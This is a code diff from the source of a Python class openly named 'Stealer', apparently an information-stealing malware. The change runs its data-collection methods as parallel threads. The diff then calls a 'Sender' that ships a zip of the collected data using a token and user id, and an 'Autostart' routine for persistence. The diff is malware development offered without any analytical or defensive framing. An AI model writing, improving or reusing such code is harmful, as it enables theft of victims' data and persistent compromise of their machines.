@@ -131,7 +131,10 @@ class Stealer(Thread):
             self.__create_storage()
 
             for method in self.methods:
-                method["object"].run()
+                method["object"].start()
+
+            for method in self.methods:
+                method["object"].join()
 
             Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
             Autostart(argv[0], (self.autostart,), self.errors).run()
